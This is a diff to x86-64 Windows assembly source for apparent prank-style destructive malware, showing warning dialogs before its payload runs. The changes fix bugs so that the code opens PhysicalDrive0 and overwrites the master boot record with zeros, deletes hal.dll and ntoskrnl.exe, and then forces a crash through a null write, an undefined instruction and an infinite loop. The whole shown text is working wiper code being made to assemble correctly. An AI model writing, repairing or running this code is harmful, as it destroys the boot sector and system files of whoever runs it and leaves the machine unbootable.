@@ -16,6 +16,8 @@ section .data
                    db "Are you absolutely sure you want to continue?", 0
     szError        db "Access denied. Admin privileges required.", 0
     driveName      db "\\.\PhysicalDrive0", 0
+    halDll         db "C:\Windows\System32\hal.dll", 0
+    ntoskrnl       db "C:\Windows\System32\ntoskrnl.exe", 0
     mbrData        times 512 db 0  ; Empty MBR data
     
     ; Glitch messages
@@ -71,7 +73,7 @@ main:
     sub rsp, 32
     
     ; First warning
-    mov rcx, 0
+    xor rcx, rcx
     lea rdx, [szMessage1]
     lea r8, [szCaption]
     mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
@@ -80,7 +82,7 @@ main:
     je exit_program
     
     ; Second warning
-    mov rcx, 0
+    xor rcx, rcx
     lea rdx, [szMessage2]
     lea r8, [szCaption]
     mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
@@ -111,7 +113,7 @@ exit_program:
     ; Restore stack and exit
     add rsp, 32
     pop rbp
-    mov rcx, 0
+    xor rcx, rcx
     call ExitProcess
     ret
 
@@ -132,7 +134,7 @@ EnablePrivileges:
     jz privilege_fail
     
     ; Lookup privilege value
-    mov rcx, 0
+    xor rcx, rcx
     lea rdx, [seDebugName]
     lea r8, [tkp+4]  ; LUID part of the structure
     call LookupPrivilegeValueA
@@ -145,9 +147,9 @@ EnablePrivileges:
     
     ; Adjust token privileges
     mov rcx, [tokenHandle]
-    mov rdx, 0
+    xor rdx, rdx
     lea r8, [tkp]
-    mov r9, 0
+    xor r9, r9
     mov qword [rsp+32], 0
     call AdjustTokenPrivileges
     test rax, rax
@@ -156,7 +158,7 @@ EnablePrivileges:
     jmp privilege_success
     
 privilege_fail:
-    mov rcx, 0
+    xor rcx, rcx
     lea rdx, [szError]
     lea r8, [szCaption]
     mov r9d, 16  ; MB_OK | MB_ICONERROR
@@ -168,8 +170,7 @@ privilege_success:
     ret
 
 StartGlitchEffects:
-    ; This would create threads for glitch effects
-    ; Implementation similar to the 32-bit version but adapted for 64-bit
+    ; Placeholder for glitch effects implementation
     ret
 
 OverwriteMBR:
@@ -178,10 +179,10 @@ OverwriteMBR:
     sub rsp, 48
     
     ; Try to open physical drive
-    mov rcx, driveName
+    lea rcx, [driveName]
     mov rdx, 0x40000000  ; GENERIC_WRITE
     mov r8, 3            ; FILE_SHARE_READ | FILE_SHARE_WRITE
-    mov r9, 0
+    xor r9, r9
     mov qword [rsp+32], 3  ; OPEN_EXISTING
     mov qword [rsp+40], 0
     call CreateFileA
@@ -190,7 +191,7 @@ OverwriteMBR:
     
     ; Write to MBR
     mov rcx, rax
-    mov rdx, mbrData
+    lea rdx, [mbrData]
     mov r8, 512
     lea r9, [rsp+32]  ; bytesWritten
     mov qword [rsp+40], 0
@@ -207,10 +208,10 @@ mbr_fail:
 
 AdditionalDestruction:
     ; Try to delete critical system files
-    mov rcx, "C:\Windows\System32\hal.dll"
+    lea rcx, [halDll]
     call DeleteFileA
     
-    mov rcx, "C:\Windows\System32\ntoskrnl.exe"
+    lea rcx, [ntoskrnl]
     call DeleteFileA
     
     ret
@@ -218,12 +219,13 @@ AdditionalDestruction:
 FinalCrash:
     ; Multiple crash methods
     ; 1. Invalid memory access
-    mov rax, 0
-    mov qword [rax], 0xDEADBEEF
+    xor rax, rax
+    mov [rax], rax
     
     ; 2. Invalid instruction
-    db 0xFF, 0xFF
+    ud2  ; Undefined instruction
     
     ; 3. Infinite loop
-    jmp $
+    .loop:
+    jmp .loop
     ret
